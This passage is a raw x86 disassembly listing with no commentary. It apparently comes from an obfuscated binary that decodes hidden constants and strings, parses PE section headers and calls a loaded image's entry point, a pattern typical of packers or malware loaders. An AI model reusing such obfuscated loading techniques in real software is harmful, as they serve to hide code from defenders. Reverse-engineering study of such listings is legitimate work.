  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
